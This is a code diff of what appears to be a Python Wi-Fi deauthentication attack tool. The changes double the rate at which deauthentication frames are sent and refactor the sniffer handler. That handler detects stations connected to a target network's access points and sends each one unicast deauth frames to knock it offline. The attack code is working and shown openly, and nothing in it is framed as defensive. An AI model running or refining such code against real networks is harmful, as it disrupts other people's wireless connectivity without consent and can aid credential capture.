@@ -21,7 +21,7 @@ BPF_DOT11_BEACON = 'wlan type mgt subtype beacon'
 BPF_DOT11_CONTROL =  'wlan type ctl'
 BPF_DOT11_DATA = 'wlan type data'
 DEAUTH_COUNT = 64
-DEAUTH_INTER = 2./DEAUTH_COUNT
+DEAUTH_INTER = 1./DEAUTH_COUNT
 
 class MsgException(Exception):
     def __init__(self, exception, message = 'Unknown error', *args, **kwargs):
@@ -116,21 +116,19 @@ def sniffer_wrapper(wifi_interface, wifi_essid, bssids_aps_dict, bssids_stas_dic
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
-                else: # wlan type ctl or wlan type data
-                    if bssids_aps_dict.get(bssid_src) and is_unicast(bssid_dst): # from ap to sta
-                        if (not bssids_stas_dict.get(bssid_dst)) or (bssids_stas_dict.get(bssid_dst) != bssid_src):
-                            bssids_stas_dict.update({bssid_dst: bssid_src})
-                            print_info(f'STA detected for network {wifi_essid}'
-                                f'\n    station      = {bssid_dst}'
-                                f'\n    access point = {bssid_src}')
-                            unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network)
-                    elif bssids_aps_dict.get(bssid_dst): # from sta to ap
-                        if (not bssids_stas_dict.get(bssid_src)) or (bssids_stas_dict.get(bssid_src) != bssid_dst):
-                            bssids_stas_dict.update({bssid_src: bssid_dst})
-                            print_info(f'STA detected for network {wifi_essid}'
-                                f'\n    station      = {bssid_src}'
-                                f'\n    access point = {bssid_dst}')
-                            unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network)
+                else: # wlan type ctl or wlan type data: from ap to sta, from sta to ap
+                    if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
+                        bssids_stas_dict.update({bssid_dst: bssid_src})
+                        print_info(f'STA detected for network {wifi_essid}'
+                            f'\n    station      = {bssid_dst}'
+                            f'\n    access point = {bssid_src}')
+                        unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network)
+                    elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
+                        bssids_stas_dict.update({bssid_src: bssid_dst})
+                        print_info(f'STA detected for network {wifi_essid}'
+                            f'\n    station      = {bssid_src}'
+                            f'\n    access point = {bssid_dst}')
+                        unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network)
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
     return sniffer_handler
